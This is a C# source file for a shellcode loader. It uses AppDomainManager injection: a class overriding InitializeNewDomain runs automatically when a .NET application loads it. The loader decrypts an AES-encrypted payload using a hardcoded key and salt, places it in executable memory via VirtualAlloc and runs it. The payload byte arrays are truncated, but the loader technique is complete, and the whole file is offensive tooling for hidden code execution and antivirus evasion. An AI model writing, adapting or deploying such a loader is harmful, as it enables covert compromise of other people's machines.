using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;



public sealed class mswow : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MoveItOnOver.Execute();
    }

}

public static class MoveItOnOver
{
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool FunctionPtr();

    static byte[] DecryptShellcode(byte[] passwordBytes, byte[] saltBytes, byte[] shellcode)
    {
        byte[] decryptedString;
        RijndaelManaged rj = new RijndaelManaged();
        try
        {
            rj.KeySize = 256;
            rj.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            rj.Key = key.GetBytes(rj.KeySize / 8);
            rj.IV = key.GetBytes(rj.BlockSize / 8);
            rj.Mode = CipherMode.CBC;

            MemoryStream ms = new MemoryStream(shellcode);

            using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
            {
                cs.Read(shellcode, 0, shellcode.Length);
                decryptedString = ms.ToArray();
            }
        }
        finally
        {
            rj.Clear();
        }
        return decryptedString;
    }

    public static void Execute()
    {

        byte[] passwordBytes = new byte[] { 243, 233, 157, 246, 124, 135, 236, 214.......};
        byte[] saltBytes = new byte[] { 22, 6, 33, 132, 119, 17, 154, 123....};
        byte[] encryptedShellcode = new byte[] { 20, 208, 51, 91, 33, 232, 27............................... };
        byte[] installerCode = DecryptShellcode(passwordBytes, saltBytes, encryptedShellcode);

        //var installerCode = Convert.FromBase64String(@"/OiJAA");
        var installerCodeAddr = GoingNative.VirtualAlloc((uint)IntPtr.Zero, (uint)installerCode.Length, (uint)StateEnum.MemCommit, (uint)ProtectionEnum.PageExecuteReadwrite);
        Marshal.Copy(installerCode, 0, installerCodeAddr, installerCode.Length);
        var runDelegate = Marshal.GetDelegateForFunctionPointer<FunctionPtr>(installerCodeAddr);
        runDelegate();

    }
}

public static class GoingNative

{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
}

public enum StateEnum

{
    MemCommit = 0x1000,
    MemReserve = 0x2000,
    MemFree = 0x10000
}

public enum ProtectionEnum

{
    PageReadonly = 0x02,
    PageReadwrite = 0x04,
    PageExecute = 0x10,
    PageExecuteRead = 0x20,
    PageExecuteReadwrite = 0x40
}
